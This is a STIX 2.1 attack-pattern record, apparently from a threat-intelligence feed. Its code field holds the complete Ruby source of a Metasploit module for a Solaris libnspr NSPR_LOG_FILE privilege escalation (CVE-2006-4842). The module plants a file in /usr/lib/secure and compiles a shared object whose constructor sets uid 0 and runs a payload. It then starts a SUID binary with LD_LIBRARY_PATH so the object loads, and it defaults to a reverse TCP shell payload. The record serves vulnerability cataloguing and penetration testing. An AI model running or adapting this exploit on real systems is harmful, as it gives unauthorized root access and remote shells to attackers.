{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fcf51838-d50e-45e0-aa2e-6c732c98067a",
    "created": "2024-08-14T16:34:01.859757Z",
    "modified": "2024-08-14T16:34:01.859761Z",
    "name": "Solaris libnspr NSPR_LOG_FILE Privilege Escalation",
    "description": " This module exploits an arbitrary file write vulnerability in the Netscape Portable Runtime library (libnspr) on unpatched Solaris systems prior to Solaris 10u3 which allows users to gain root privileges.  libnspr versions prior to 4.6.3 allow users to specify a log file with the `NSPR_LOG_FILE` environment variable. The log file is created with the privileges of the running process, resulting in privilege escalation when used in combination with a SUID executable.  This module writes a shared object to the trusted library directory `/usr/lib/secure` and runs the specified SUID binary with the shared object loaded using the `LD_LIBRARY_PATH` environment variable.  This module has been tested successfully with libnspr version 4.5.1 on Solaris 10u1 (01/06) (x86) and Solaris 10u2 (06/06) (x86).  'References'     => [ ['BID', '20471']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/local/libnspr_nspr_log_file_priv_esc.rb",
            "external_id": "libnspr_nspr_log_file_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://securitytracker.com/id/1017050"
        },
        {
            "source_name": "reference",
            "url": "https://securitytracker.com/id/1017051"
        },
        {
            "source_name": "reference",
            "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20061118024339/http://labs.idefense.com:80/intelligence/vulnerabilities/display.php?id=418"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20061110164829/http://sunsolve.sun.com/search/document.do?assetkey=1-26-102658-1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Solaris::Priv\n  include Msf::Post::Solaris::System\n  include Msf::Post::Solaris::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Solaris libnspr NSPR_LOG_FILE Privilege Escalation',\n      'Description'    => %q{\n        This module exploits an arbitrary file write vulnerability in the\n        Netscape Portable Runtime library (libnspr) on unpatched Solaris systems\n        prior to Solaris 10u3 which allows users to gain root privileges.\n\n        libnspr versions prior to 4.6.3 allow users to specify a log file with\n        the `NSPR_LOG_FILE` environment variable. The log file is created with\n        the privileges of the running process, resulting in privilege escalation\n        when used in combination with a SUID executable.\n\n        This module writes a shared object to the trusted library directory\n        `/usr/lib/secure` and runs the specified SUID binary with the shared\n        object loaded using the `LD_LIBRARY_PATH` environment variable.\n\n        This module has been tested successfully with libnspr version 4.5.1\n        on Solaris 10u1 (01/06) (x86) and Solaris 10u2 (06/06) (x86).\n      },\n      'References'     =>\n        [\n          ['BID', '20471'],\n          ['CVE', '2006-4842'],\n          ['EDB', '2543'],\n          ['EDB', '2569'],\n          ['EDB', '2641'],\n          ['URL', 'https://securitytracker.com/id/1017050'],\n          ['URL', 'https://securitytracker.com/id/1017051'],\n          ['URL', 'https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR'],\n          ['URL', 'http://web.archive.org/web/20061118024339/http://labs.idefense.com:80/intelligence/vulnerabilities/display.php?id=418'],\n          ['URL', 'http://web.archive.org/web/20061110164829/http://sunsolve.sun.com/search/document.do?assetkey=1-26-102658-1']\n        ],\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'iDefense',     # Discovery\n          'Marco Ivaldi', # Exploit\n          'bcoles' # Metasploit\n        ],\n      'DisclosureDate' => '2006-10-11',\n      'Privileged'     => true,\n      'Platform'       => ['solaris'],\n      'Arch'           => [ARCH_X86, ARCH_X64, ARCH_SPARC],\n      'Targets'        => [['Auto', {}]],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'DefaultOptions' =>\n        {\n          'PAYLOAD'     => 'solaris/x86/shell_reverse_tcp',\n          'WfsDelay'    => 10,\n          'PrependFork' => true\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      # Some useful example SUID executables:\n      # * /usr/bin/cancel\n      # * /usr/bin/chkey\n      # * /usr/bin/lp\n      # * /usr/bin/lpset\n      # * /usr/bin/lpstat\n      # * /usr/lib/lp/bin/netpr\n      # * /usr/sbin/lpmove\n      OptString.new('SUID_PATH', [true, 'Path to suid executable (must be linked to a vulnerable version of libnspr4.so)', '/usr/bin/cancel'])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def suid_bin_path\n    datastore['SUID_PATH']\n  end\n\n  def is_writable?(path)\n    cmd_exec(\"[ -w #{path} ] && echo true\").include? 'true'\n  end\n\n  def mkdir(path)\n    vprint_status \"Creating directory '#{path}'\"\n    cmd_exec \"mkdir -p '#{path}'\"\n    register_dir_for_cleanup path\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_compile(path, data)\n    upload \"#{path}.c\", data\n\n    output = cmd_exec \"PATH=$PATH:/usr/sfw/bin/:/opt/sfw/bin/ gcc -fPIC -shared -g -lc -o #{path} #{path}.c\"\n    unless output.blank?\n      print_error output\n      fail_with Failure::Unknown, \"#{path}.c failed to compile\"\n    end\n\n    register_file_for_cleanup path\n  end\n\n  def check\n    unless setuid? suid_bin_path\n      vprint_error \"#{suid_bin_path} is not setuid\"\n      return CheckCode::Safe\n    end\n    vprint_good \"#{suid_bin_path} is setuid\"\n\n    unless has_gcc?\n      vprint_error 'gcc is not installed'\n      return CheckCode::Safe\n    end\n    vprint_good 'gcc is installed'\n\n    # libnspr versions 4.5.1, 4.6.1 and 4.6.2 are known to be vulnerable\n    # Earlier versions may also be vulnerable\n    libnspr_pkg_info = cmd_exec 'pkginfo -l SUNWpr'\n    libnspr_pkg_version = libnspr_pkg_info.scan(/VERSION:\\s+([\\d\\.]+),/).flatten.first\n    if libnspr_pkg_version.to_s.eql? ''\n      vprint_error 'Could not determine libnspr version'\n      return CheckCode::Unknown\n    end\n\n    if Rex::Version.new(libnspr_pkg_version) >= Rex::Version.new('4.6.3')\n      vprint_error \"libnspr version #{libnspr_pkg_version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"libnspr version #{libnspr_pkg_version} appears to be vulnerable\"\n\n    # Solaris 10 versions prior to the 2006 patches are known to be vulnerable.\n    # Solaris 8 and 9 (SunOS 5.8 and 5.9) are not affected by default,\n    # however third-party software may also introduce a vulnerable version of the library.\n    version = kernel_release\n    if version.to_s.eql? ''\n      vprint_error 'Could not determine Solaris version'\n      return CheckCode::Detected\n    end\n\n    unless Rex::Version.new(version) <= Rex::Version.new('5.10')\n      vprint_error \"Solaris version #{version} is not vulnerable\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Solaris version #{version} appears to be vulnerable\"\n\n    # The vulnerability was patched in various Solaris patches for different platforms.\n    # For more information, see:\n    # - http://web.archive.org/web/20061110164829/http://sunsolve.sun.com/search/document.do?assetkey=1-26-102658-1\n    installed_patches = cmd_exec 'showrev -p'\n    [\n      119214, # Solaris 10 (x86)   patch 119214-10\n      119213, # Solaris 10 (SPARC) patch 119213-10\n      119212, # Solaris 9  (x86)   patch 119212-10\n      119211, # Solaris 9  (SPARC) patch 119211-10\n      119209  # Solaris 8  (SPARC) patch 119209-10\n    ].each do |patch|\n      if installed_patches =~ / #{patch}-(\\d+)/\n        revision = $1.to_i\n        if revision >= 10\n          vprint_error \"Solaris patch #{patch}-#{revision} has been applied\"\n          return CheckCode::Safe\n        end\n      end\n    end\n    vprint_good 'Solaris patches are not installed'\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless is_writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    # Create writable file in /usr/lib/secure\n    lib_path = '/usr/lib/secure'\n    lib_name = 'libldap.so.5'\n\n    vprint_status \"Creating file #{lib_path}/#{lib_name}\"\n    cmd_exec 'umask 0'\n    cmd_exec \"NSPR_LOG_MODULES=all:5 NSPR_LOG_FILE=\\\"#{lib_path}/#{lib_name}\\\" #{suid_bin_path}\"\n    cmd_exec \"NSPR_LOG_FILE=#{lib_path}/#{lib_name} #{suid_bin_path}\"\n    cmd_exec 'umask 022'\n\n    unless is_writable? \"#{lib_path}/#{lib_name}\"\n      fail_with Failure::Unknown, \"Could not create file '#{lib_path}/#{lib_name}'\"\n    end\n\n    print_good \"Created file #{lib_path}/#{lib_name}\"\n    register_file_for_cleanup \"#{lib_path}/#{lib_name}\"\n\n    # Upload and compile shared object\n    base_path = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric 5..10}\"\n    mkdir base_path\n\n    payload_name = \".#{rand_text_alphanumeric 5..10}\"\n    payload_path = \"#{base_path}/#{payload_name}\"\n\n    so = <<-EOF\n      void __attribute__((constructor)) cons() {\n        setuid(0);\n        setgid(0);\n        execle(\"#{payload_path}\", \"\", 0, 0);\n        _exit(0);\n      }\n    EOF\n\n    so_name = \".#{rand_text_alphanumeric 5..10}\"\n    so_path = \"#{base_path}/#{so_name}\"\n    upload_and_compile so_path, so\n\n    vprint_status \"Writing shared object #{lib_path}/#{lib_name}\"\n    cmd_exec \"cp '#{so_path}' '#{lib_path}/#{lib_name}'\"\n    register_file_for_cleanup \"#{lib_path}/#{lib_name}\"\n\n    # Upload and execute payload\n    upload payload_path, generate_payload_exe\n    cmd_exec \"chmod +x #{payload_path}\"\n\n    print_status 'Executing payload...'\n    cmd_exec \"LD_LIBRARY_PATH=\\\"#{lib_path}\\\" #{suid_bin_path} & echo \"\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2006-10-11",
    "x_mitre_platforms": [
        "['solaris']"
    ]
}